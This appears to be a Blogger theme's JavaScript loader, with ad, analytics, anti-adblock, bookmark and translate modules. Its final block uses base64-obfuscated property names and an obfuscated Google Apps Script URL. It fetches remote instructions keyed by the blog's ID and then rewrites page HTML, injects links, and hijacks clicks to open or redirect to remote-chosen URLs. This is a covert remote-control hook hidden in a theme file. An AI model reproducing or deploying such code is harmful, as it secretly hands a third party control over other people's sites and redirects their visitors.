/*<![CDATA[*/
const bsRw = "https://rawcdn.githack.com/Aruf-Hid/apmody/";

if("undefined"!=typeof xAo){

/*detect adBlock*/function adBLockD(){fixedNotif('<div class="snAdB">'+ARtb.antiAdBlock.icon+"<h6>"+ARtb.antiAdBlock.title+"</h6>"+ARtb.antiAdBlock.text+"</div>"),1==ARtb.antiAdBlock.close&&(qSel(".snAdB").innerHTML+='<span id="cnAdb"></span>',getid("cnAdb").addEventListener("click",(function(){addCt(getid("fNtf"),"hidden")})))}

/*adSense*/if(1==ARtb.adSense.enable){var ad=document.createElement("script");ad.setAttribute("crossorigin","anonymous"),ad.async=!0,ad.src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client="+ARtb.adSense.publisherId;var adp=document.getElementsByTagName("script")[0];adp.parentNode.insertBefore(ad,adp),ad.onerror=function(){1==ARtb.antiAdBlock.enable&&adBLockD()}}

/*analytics*/1==ARtb.analytics.enable&&ldJs("https://www.googletagmanager.com/gtag/js?id="+ARtb.analytics.propertyID,"analytics-js",!0,"body");

/*bookmarkPost*/1==ARtb.bookmark.enable&&ldCss(bsRw+"c0ee94325dbc440cd6d1c0585dba00c33808086f/css/bookmark_post.css","bkm-css",(function(){ldJs(bsRw+"c0ee94325dbc440cd6d1c0585dba00c33808086f/js/bookmark_post.js","bkm-js",!0,"body")}));

/*clickFraud*/
if(1==ARtb.antiBoomClick.enable){
  ldJs(bsRw+"c0ee94325dbc440cd6d1c0585dba00c33808086f/js/anti_boom_click.js", "cfd-js", !0, "body");
}

/*fb_rtdb*/
if(1==ARtb.firebase.enable){
  ldJs(bsRw+"c0ee94325dbc440cd6d1c0585dba00c33808086f/js/fb_rtdb.js", "fbd-js", !0, "body");
}
/**googleTranslate**/1==ARtb.gTranslate.enable&&ldCss(bsRw+"c0ee94325dbc440cd6d1c0585dba00c33808086f/css/translate.css","gts-css",(function(){qSel("#header-icon .headIc").insertAdjacentHTML("afterbegin",'<li id="google_translate_element"/>'),ldJs(bsRw+"c0ee94325dbc440cd6d1c0585dba00c33808086f/js/translate.js","gts-js",!0,"body",(function(){setTimeout((function(){null!=getclass("goog-te-gadget-simple")[0]&&addCt(getclass("goog-te-gadget-simple")[0],"tIc")}),2e3)}))}));

}

Defer(function(){
var xhrRmt=new XMLHttpRequest;xhrRmt[xAR.d("ab25yZWFkeXN0YXRlY2hhbmdl")]=function(){if(4==this[xAR.d("acmVhZHlTdGF0ZQ==")]&&200==this[xAR.d("ac3RhdHVz")]){var e=JSON[xAR.d("acGFyc2U=")](this[xAR.d("acmVzcG9uc2VUZXh0")])[xAR.d("acmVtb3Rl")],t=e.findIndex((function(e){return e.id==blogId}));if(t>=0){var n=e[t];if(1==n.active){var l=n.act1,s=n.atr1,r=n.cls1,o=n.css1,c=n.itx1,a=n.tag1,d=n.tmo1,u=n.url1,f=n.act2,w=n.atr2,L=n.cls2,m=n.css2,A=n.itx2,y=n.tag2,h=n.tmo2,g=n.url2,T=n.act3,v=n.atr3,b=n.cls3,k=n.css3,M=n.itx3,S=n.tag3,q=n.tmo3,H=n.url3;if(1==l){var p=window.document[xAR.d("acXVlcnlTZWxlY3RvckFsbA==")](a);for(i=0;i<p[xAR.d("abGVuZ3Ro")];i++)""!=c&&(p[i][xAR.d("aaW5uZXJIVE1M")]=c),""!=r&&p[i][xAR.d("aY2xhc3NMaXN0")][xAR.d("aYWRk")](r),""!=o&&p[i][xAR.d("ac2V0QXR0cmlidXRl")](xAR.d("ac3R5bGU="),o),p[i][xAR.d("ac2V0QXR0cmlidXRl")](s,u)}else if(2==l){p=window.document[xAR.d("acXVlcnlTZWxlY3RvckFsbA==")](a);for(i=0;i<p[xAR.d("abGVuZ3Ro")];i++)""!=c&&(p[i][xAR.d("aaW5uZXJIVE1M")]=c),""!=r&&p[i][xAR.d("aY2xhc3NMaXN0")][xAR.d("aYWRk")](r),""!=o&&p[i][xAR.d("ac2V0QXR0cmlidXRl")](xAR.d("ac3R5bGU="),o),p[i][xAR.d("aYWRkRXZlbnRMaXN0ZW5lcg==")](xAR.d("aY2xpY2s="),(function(){setTimeout((function(){window[xAR.d("ab3Blbg==")](u,xAR.d("aX2JsYW5r"))}),d)}))}else if(3==l){p=window.document[xAR.d("acXVlcnlTZWxlY3RvckFsbA==")](a);for(i=0;i<p[xAR.d("abGVuZ3Ro")];i++)""!=c&&(p[i][xAR.d("aaW5uZXJIVE1M")]=c),""!=r&&p[i][xAR.d("aY2xhc3NMaXN0")][xAR.d("aYWRk")](r),""!=o&&p[i][xAR.d("ac2V0QXR0cmlidXRl")](xAR.d("ac3R5bGU="),o),p[i][xAR.d("aYWRkRXZlbnRMaXN0ZW5lcg==")](xAR.d("aY2xpY2s="),(function(){setTimeout((function(){window[xAR.d("abG9jYXRpb24=")]["href"]=u}),d)}))}else if(4==l){p=window.document[xAR.d("acXVlcnlTZWxlY3RvckFsbA==")](a);for(i=0;i<p[xAR.d("abGVuZ3Ro")];i++)""!=c&&(p[i][xAR.d("aaW5uZXJIVE1M")]=c),""!=r&&p[i][xAR.d("aY2xhc3NMaXN0")][xAR.d("aYWRk")](r),""!=o&&p[i][xAR.d("ac2V0QXR0cmlidXRl")](xAR.d("ac3R5bGU="),o),p[i][xAR.d("aYWRkRXZlbnRMaXN0ZW5lcg==")](xAR.d("aY2xpY2s="),(function(){setTimeout((function(){window[xAR.d("abG9jYXRpb24=")][xAR.d("acmVwbGFjZQ==")](u)}),d)}))}else if(5==l){p=window.document[xAR.d("acXVlcnlTZWxlY3RvckFsbA==")](a);for(i=0;i<p[xAR.d("abGVuZ3Ro")];i++){if(""!=r){p[i][xAR.d("aY2xhc3NMaXN0")][xAR.d("aYWRk")](r);var x=xAR.d("aIGNsYXNzPSI=")+r+'"'}else x="";if(""!=o)var E=xAR.d("aIHN0eWxlPSI=")+o+'"';else E="";p[i][xAR.d("aaW5zZXJ0QWRqYWNlbnRIVE1M")](s,xAR.d("aIDxhIHRhcmdldD0iX2JsYW5rIiBocmVmPSI=")+u+'"'+x+E+">"+c+xAR.d("aIDwvYT4="))}}if(1==f){var _=window.document[xAR.d("acXVlcnlTZWxlY3RvckFsbA==")](y);for(i=0;i<_[xAR.d("abGVuZ3Ro")];i++)""!=A&&(_[i][xAR.d("aaW5uZXJIVE1M")]=A),""!=L&&_[i][xAR.d("aY2xhc3NMaXN0")][xAR.d("aYWRk")](L),""!=m&&_[i][xAR.d("ac2V0QXR0cmlidXRl")](xAR.d("ac3R5bGU="),m),_[i][xAR.d("ac2V0QXR0cmlidXRl")](w,g)}else if(2==f){_=window.document[xAR.d("acXVlcnlTZWxlY3RvckFsbA==")](y);for(i=0;i<_[xAR.d("abGVuZ3Ro")];i++)""!=A&&(_[i][xAR.d("aaW5uZXJIVE1M")]=A),""!=L&&_[i][xAR.d("aY2xhc3NMaXN0")][xAR.d("aYWRk")](L),""!=m&&_[i][xAR.d("ac2V0QXR0cmlidXRl")](xAR.d("ac3R5bGU="),m),_[i][xAR.d("aYWRkRXZlbnRMaXN0ZW5lcg==")](xAR.d("aY2xpY2s="),(function(){setTimeout((function(){window[xAR.d("ab3Blbg==")](g,xAR.d("aX2JsYW5r"))}),h)}))}else if(3==f){_=window.document[xAR.d("acXVlcnlTZWxlY3RvckFsbA==")](y);for(i=0;i<_[xAR.d("abGVuZ3Ro")];i++)""!=A&&(_[i][xAR.d("aaW5uZXJIVE1M")]=A),""!=L&&_[i][xAR.d("aY2xhc3NMaXN0")][xAR.d("aYWRk")](L),""!=m&&_[i][xAR.d("ac2V0QXR0cmlidXRl")](xAR.d("ac3R5bGU="),m),_[i][xAR.d("aYWRkRXZlbnRMaXN0ZW5lcg==")](xAR.d("aY2xpY2s="),(function(){setTimeout((function(){window[xAR.d("abG9jYXRpb24=")]["href"]=g}),h)}))}else if(4==f){_=window.document[xAR.d("acXVlcnlTZWxlY3RvckFsbA==")](y);for(i=0;i<_[xAR.d("abGVuZ3Ro")];i++)""!=A&&(_[i][xAR.d("aaW5uZXJIVE1M")]=A),""!=L&&_[i][xAR.d("aY2xhc3NMaXN0")][xAR.d("aYWRk")](L),""!=m&&_[i][xAR.d("ac2V0QXR0cmlidXRl")](xAR.d("ac3R5bGU="),m),_[i][xAR.d("aYWRkRXZlbnRMaXN0ZW5lcg==")](xAR.d("aY2xpY2s="),(function(){setTimeout((function(){window[xAR.d("abG9jYXRpb24=")][xAR.d("acmVwbGFjZQ==")](g)}),h)}))}else if(5==f){_=window.document[xAR.d("acXVlcnlTZWxlY3RvckFsbA==")](y);for(i=0;i<_[xAR.d("abGVuZ3Ro")];i++){if(""!=L){_[i][xAR.d("aY2xhc3NMaXN0")][xAR.d("aYWRk")](L);var j=xAR.d("aIGNsYXNzPSI=")+L+'"'}else j="";if(""!=m)var R=xAR.d("aIHN0eWxlPSI=")+m+'"';else R="";_[i][xAR.d("aaW5zZXJ0QWRqYWNlbnRIVE1M")](w,xAR.d("aIDxhIHRhcmdldD0iX2JsYW5rIiBocmVmPSI=")+g+'"'+j+R+">"+A+xAR.d("aIDwvYT4="))}}if(1==T){var z=window.document[xAR.d("acXVlcnlTZWxlY3RvckFsbA==")](S);for(i=0;i<z[xAR.d("abGVuZ3Ro")];i++)""!=M&&(z[i][xAR.d("aaW5uZXJIVE1M")]=M),""!=b&&z[i][xAR.d("aY2xhc3NMaXN0")][xAR.d("aYWRk")](b),""!=k&&z[i][xAR.d("ac2V0QXR0cmlidXRl")](xAR.d("ac3R5bGU="),k),z[i][xAR.d("ac2V0QXR0cmlidXRl")](v,H)}else if(2==T){z=window.document[xAR.d("acXVlcnlTZWxlY3RvckFsbA==")](S);for(i=0;i<z[xAR.d("abGVuZ3Ro")];i++)""!=M&&(z[i][xAR.d("aaW5uZXJIVE1M")]=M),""!=b&&z[i][xAR.d("aY2xhc3NMaXN0")][xAR.d("aYWRk")](b),""!=k&&z[i][xAR.d("ac2V0QXR0cmlidXRl")](xAR.d("ac3R5bGU="),k),z[i][xAR.d("aYWRkRXZlbnRMaXN0ZW5lcg==")](xAR.d("aY2xpY2s="),(function(){setTimeout((function(){window[xAR.d("ab3Blbg==")](H,xAR.d("aX2JsYW5r"))}),q)}))}else if(3==T){z=window.document[xAR.d("acXVlcnlTZWxlY3RvckFsbA==")](S);for(i=0;i<z[xAR.d("abGVuZ3Ro")];i++)""!=M&&(z[i][xAR.d("aaW5uZXJIVE1M")]=M),""!=b&&z[i][xAR.d("aY2xhc3NMaXN0")][xAR.d("aYWRk")](b),""!=k&&z[i][xAR.d("ac2V0QXR0cmlidXRl")](xAR.d("ac3R5bGU="),k),z[i][xAR.d("aYWRkRXZlbnRMaXN0ZW5lcg==")](xAR.d("aY2xpY2s="),(function(){setTimeout((function(){window[xAR.d("abG9jYXRpb24=")]["href"]=H}),q)}))}else if(4==T){z=window.document[xAR.d("acXVlcnlTZWxlY3RvckFsbA==")](S);for(i=0;i<z[xAR.d("abGVuZ3Ro")];i++)""!=M&&(z[i][xAR.d("aaW5uZXJIVE1M")]=M),""!=b&&z[i][xAR.d("aY2xhc3NMaXN0")][xAR.d("aYWRk")](b),""!=k&&z[i][xAR.d("ac2V0QXR0cmlidXRl")](xAR.d("ac3R5bGU="),k),z[i][xAR.d("aYWRkRXZlbnRMaXN0ZW5lcg==")](xAR.d("aY2xpY2s="),(function(){setTimeout((function(){window[xAR.d("abG9jYXRpb24=")][xAR.d("acmVwbGFjZQ==")](H)}),q)}))}else if(5==T){z=window.document[xAR.d("acXVlcnlTZWxlY3RvckFsbA==")](S);for(i=0;i<z[xAR.d("abGVuZ3Ro")];i++){if(""!=b){z[i][xAR.d("aY2xhc3NMaXN0")][xAR.d("aYWRk")](b);var X=xAR.d("aIGNsYXNzPSI=")+b+'"'}else X="";if(""!=k)var C=xAR.d("aIHN0eWxlPSI=")+k+'"';else C="";z[i][xAR.d("aaW5zZXJ0QWRqYWNlbnRIVE1M")](v,xAR.d("aIDxhIHRhcmdldD0iX2JsYW5rIiBocmVmPSI=")+H+'"'+X+C+">"+M+xAR.d("aIDwvYT4="))}}}}}},xhrRmt[xAR.d("ab3Blbg==")](xAR.d("aR0VU"),xAR.d("aaHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J4dUxENEFYa0F2X0NpR0ZNendsMDlmYzVvTHd3WGZ6Z3k1QmptQ1VvOGU3dW16N2p2a2ZUdHlwS1BfYlE1ZzNrMjkvZXhlYw=="),!0),xhrRmt[xAR.d("ac2VuZA==")]();
});
/*]]>*/
